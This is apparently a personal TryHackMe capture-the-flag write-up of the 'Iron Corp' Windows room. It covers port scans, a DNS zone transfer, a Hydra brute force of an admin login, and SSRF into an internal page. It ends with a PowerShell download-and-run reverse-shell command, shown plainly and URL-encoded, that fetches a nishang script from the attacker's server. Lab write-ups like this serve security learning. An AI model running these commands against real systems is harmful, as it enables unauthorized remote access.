<h1 align="center">Iron Corp</h1>
<p align="center">July 31, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>451</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Can you get access to Iron Corp's system?</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/b3ed0f80-a066-4e1e-9f3a-1beb3be2e98c"><br>
Click <a href="https://tryhackme.com/room/ironcorp">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src=""></p>




<br>

<h2>Task 1 .Flags</h2>
<p>Iron Corp suffered a security breach not long time ago.<br>

You have been chosen by Iron Corp to conduct a penetration test of their asset. They did system hardening and are expecting you not to be able to access their system.<br>

The asset in scope is: ironcorp.me<br>

Note: Edit your config file and add ironcorp.me<br>

Note 2: It might take around 5-7 minutes for the VM to fully boot, so please be patient.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. user.txtbr>
<code>_____</code></p>

<br>

<p>1.2. root.txtbr>
<code>_____</code></p>


<br>

<h3>/etc/hosts</h3>

```bash
TargetIP     ironcorp.me
```


<h3>Nmap</h3>

```bash
:~/IronCorp# nmap -p- -vv ironcorp.me
...
PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 128
135/tcp   open  msrpc         syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5985/tcp  open  wsman         syn-ack ttl 128
8080/tcp  open  http-proxy    syn-ack ttl 128
11025/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49670/tcp open  unknown       syn-ack ttl 128
```

```bash
:~/IronCorp# nmap -sS -Pn -p- -T5 ironcorp.me
...
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
11025/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
```

```bash
:~/IronCorp# rustscan -a xx.xx.xx.xxx --ulimit 5000 -b 65535 -- -A -Pn
...
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
11025/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
```

```bash
:~/IronCorp# rustscan -a 10.10.27.103 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.\U0001f422

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.27.103:53
Open 10.10.27.103:135
Open 10.10.27.103:3389
Open 10.10.27.103:5985
Open 10.10.27.103:8080
Open 10.10.27.103:11025
Open 10.10.27.103:49670
Open 10.10.27.103:49667
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-01 01:16 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:16
Completed NSE at 01:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:16
Completed NSE at 01:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:16
Completed NSE at 01:16, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 01:16
Completed Parallel DNS resolution of 1 host. at 01:16, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:16
Scanning ip-10-10-27-103.eu-west-1.compute.internal (10.10.27.103) [8 ports]
Discovered open port 135/tcp on 10.10.27.103
Discovered open port 53/tcp on 10.10.27.103
Discovered open port 8080/tcp on 10.10.27.103
Discovered open port 3389/tcp on 10.10.27.103
Discovered open port 49670/tcp on 10.10.27.103
Discovered open port 49667/tcp on 10.10.27.103
Discovered open port 5985/tcp on 10.10.27.103
Discovered open port 11025/tcp on 10.10.27.103
Completed Connect Scan at 01:16, 0.24s elapsed (8 total ports)
Initiating Service scan at 01:16
Scanning 8 services on ip-10-10-27-103.eu-west-1.compute.internal (10.10.27.103)
Completed Service scan at 01:19, 143.62s elapsed (8 services on 1 host)
NSE: Script scanning 10.10.27.103.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:19
Completed NSE at 01:19, 14.45s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:19
Completed NSE at 01:19, 1.21s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:19
Completed NSE at 01:19, 0.00s elapsed
Nmap scan report for ip-10-10-27-103.eu-west-1.compute.internal (10.10.27.103)
Host is up, received user-set (0.22s latency).
Scanned at 2025-08-01 01:16:57 UTC for 160s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2025-08-01T01:19:21+00:00
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Issuer: commonName=WIN-8VMBKF3G815
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-31T00:48:43
| Not valid after:  2026-01-30T00:48:43
| MD5:   9278 1461 c030 09f6 3d60 0acd 12e5 d20a
| SHA-1: 56dc 8460 f7cf 4a05 fe76 7c81 3ba1 2e21 3eda 2b85
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQWRcbnyVb4ZVHx7fpg2OI/DANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwHhcNMjUwNzMxMDA0ODQzWhcNMjYw
| MTMwMDA0ODQzWjAaMRgwFgYDVQQDEw9XSU4tOFZNQktGM0c4MTUwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2cMoTwqE64A4Z4Yg9VFqmSXm12cbf1fhF
| yHH/jLSfQpdtqMhJp+L1LKeby2WTDJI7l72OvKVVCmaDPu1cFWoWOn76hBsGHG67
| KOWiNJ3lWYnuQYmxB+hVfr7svtrZGO+kn8SyNnIuFrwHyC+7E1/a8upq8wbCtDtU
| 6FXJ7tCeu4ipKWi2ZCgEEK1GNjcRWrePQQWUsmtv8gs2mFFrEMUZAClDHki7x3mb
| wATiMgJr++n/dV1YAGvUBvhCkuMNrCjyeTLA4kSai/JY+uB80OGU4YNExPs/veHE
| noga5/UsoJmy3KqOQqyt48RX9VRMxQlspHGTvXYpP5jzvAW0j9J9AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAtdym7fBomxFIQM25wR8NNdWyY9UWyCpUe4U2HPiUoCp9g5QaG0RvgTU+
| u3JeR2i5zYmXh0gJqJ1CMskUDt4uncpfDtFE4NAhDma+6TwleB4nVaTAx7ExNiBQ
| VyvtyW2b6hMm3gFVHjdXz3VyF/F4uQfooi2QcELmDnapNFKcugpXa3l8eK0SjGQD
| 7CL3Y7D4P7B4lThHqtkEfa0VZdExB8Ku4NGZcOaV8cEcJ82QEcpEX2B6IHEG94rk
| eqDo7JphpRmrTFVMEevsUfG4CIQFesyvPxtC0OSiSnC7c38isAuokbAAB/wvfXMv
| DhIOctQDwqctVRPklaMvpydWlkMnOQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-01T01:19:35+00:00; -1s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
11025/tcp open  http          syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
|_http-title: Coming Soon - Start Bootstrap Theme
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
```

<h3>dig</h3>

```bash
:~/IronCorp# dig axfr ironcorp.me @10.10.248.146

; <<>> DiG 9.18.28-0ubuntu0.20.04.1-Ubuntu <<>> axfr ironcorp.me @10.10.248.146
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 480 msec
;; SERVER: 10.10.248.146#53(10.10.248.146) (TCP)
;; WHEN: Fri Aug 01 03:53:39 BST 2025
;; XFR size: 5 records (messages 1, bytes 238)
```
<h3>/etc/hosts</h3>


```bash
10.10.76.56 ironcorp.me admin.ironcorp.me internal.ironcorp.me
```

<h3>ironcorp.me:8080</h3>

<img width="1059" height="674" alt="image" src="https://github.com/user-attachments/assets/4c6a6b40-2ef8-4231-ab51-d61e07065034" />

<h3>ironcorp.me:8080/login.html</h3>

<img width="1056" height="509" alt="image" src="https://github.com/user-attachments/assets/d828e3b1-9a44-44e0-9a56-9b00096c7ca1" />

<h3>ironcorp.me:11025</h3>

<img width="1062" height="351" alt="image" src="https://github.com/user-attachments/assets/15487d11-affb-4284-a147-0a8074d3b687" />

<img width="1062" height="320" alt="image" src="https://github.com/user-attachments/assets/85872486-4a9a-4337-8340-21d9369b4a2c" />

<img width="1200" height="645" alt="image" src="https://github.com/user-attachments/assets/b669a368-1610-4d97-9721-dd2185b01baa" />


<h3>Hydra</h3>

<p>admin: password123</p>

```bash
:~/IronCorp# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get '/'
```


<img width="1099" height="126" alt="image" src="https://github.com/user-attachments/assets/b0b16af0-ccd0-43d9-b719-fe1c44d2e03d" />

<img width="1200" height="636" alt="image" src="https://github.com/user-attachments/assets/c395a147-5819-4c0d-95a5-106719691c5e" />

<img width="1195" height="505" alt="image" src="https://github.com/user-attachments/assets/ce5bcf6d-4983-443a-8521-9fad53161fc0" />



<h3>Repeater</h3>

<img width="1191" height="209" alt="image" src="https://github.com/user-attachments/assets/4ff48264-3d11-4720-9f66-bf45151a2b37" />

<img width="1188" height="382" alt="image" src="https://github.com/user-attachments/assets/30bbb507-dd18-4fd7-b735-fcd74cc907bc" />

<img width="1171" height="629" alt="image" src="https://github.com/user-attachments/assets/5eff7c69-215d-434a-9611-06ddc20ad92c" />


<h3>http server</h3>

```bash
:~/IronCorp# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<img width="1194" height="271" alt="image" src="https://github.com/user-attachments/assets/4a35e071-6687-401e-afd2-eb437a2dfbd0" />

<img width="1098" height="112" alt="image" src="https://github.com/user-attachments/assets/8288f1d0-67d0-438c-94ce-3be97c0d29db" />

<img width="1060" height="606" alt="image" src="https://github.com/user-attachments/assets/0f4d65a9-87a5-4556-acbe-152f9c026ee2" />


<img width="1192" height="414" alt="image" src="https://github.com/user-attachments/assets/eb8146ac-fd8d-4b78-b3dc-12abfaf06c28" />

<img width="1058" height="287" alt="image" src="https://github.com/user-attachments/assets/7ba8b9a3-3c68-46cd-a6bc-64de0d236ea1" />

<img width="1060" height="282" alt="image" src="https://github.com/user-attachments/assets/24e9a1fe-38ce-4487-a240-89c5a74cd7dd" />

<p>hi</p>

<img width="1192" height="268" alt="image" src="https://github.com/user-attachments/assets/8c67a9c1-cf80-40eb-82d5-8105d91fa125" />

<p>whoami</p>

<img width="1059" height="233" alt="image" src="https://github.com/user-attachments/assets/91c8c4fe-5d2e-4ebc-b81b-8f0383d83135" />


<h3>Invoke-Powershell</h3>

<img width="862" height="313" alt="image" src="https://github.com/user-attachments/assets/a5ed30ba-3a31-4fcb-85cf-23f04bee0d3c" />


```bash
:~/IronCorp# https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellIcmp.ps1
```

```bash
:~/IronCorp# mv Invoke-PowerShellIcmp.ps1 shell.ps1
```



:~/IronCorp# git clone https://github.com/samratashok/nishang.git
Cloning into 'nishang'...
remote: Enumerating objects: 1705, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 1705 (delta 5), reused 8 (delta 2), pack-reused 1691 (from 1)
Receiving objects: 100% (1705/1705), 10.89 MiB | 18.55 MiB/s, done.
Resolving deltas: 100% (1064/1064), done.
root@ip-10-10-210-152:~/IronCorp# cd nishang
root@ip-10-10-210-152:~/IronCorp/nishang# ls
ActiveDirectory  CHANGELOG.txt   Execution  MITM          Prasadhak  Utility
Antak-WebShell   Client          Gather     nishang.psm1  README.md
Backdoors        DISCLAIMER.txt  LICENSE    Pivot         Scan
Bypass           Escalation      Misc       powerpreter   Shells
:~/IronCorp/nishang# cd Shells
:~/IronCorp/nishang/Shells# ls
Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
Invoke-PoshRatHttp.ps1               Invoke-PowerShellWmi.ps1
Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
Invoke-PowerShellTcpOneLine.ps1
root@ip-10-10-210-152:~/IronCorp/nishang/Shells# tail Invoke-PowerShellTcp.ps1
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

:~/IronCorp/nishang/Shells# nano Invoke-PowerShellTcp.ps1
:~/IronCorp/nishang/Shells# powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]


<img width="1193" height="356" alt="image" src="https://github.com/user-attachments/assets/10c21602-5c84-49da-aafe-f70865d92a02" />

:~/IronCorp/nishang/Shells# ls
Invoke-ConPtyShell.ps1  Invoke-PoshRatHttp.ps1     Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcatAgent.ps1
Invoke-JSRatRegsvr.ps1  Invoke-PoshRatHttps.ps1    Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellUdp.ps1         Invoke-PsGcat.ps1
Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1             Invoke-PowerShellWmi.ps1         Remove-PoshRat.ps1
:~/IronCorp/nishang/Shells# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


powershell.exe -c iex(new-object net.webclient).downloadstring(http://10.10.210.152:8000/Invoke-PowerShellTcp.ps1')
%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%31%38%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%31%25%33%30%25%32%65%25%33%32%25%33%31%25%33%30%25%32%65%25%33%31%25%33%35%25%33%32%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39

http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=Equinox


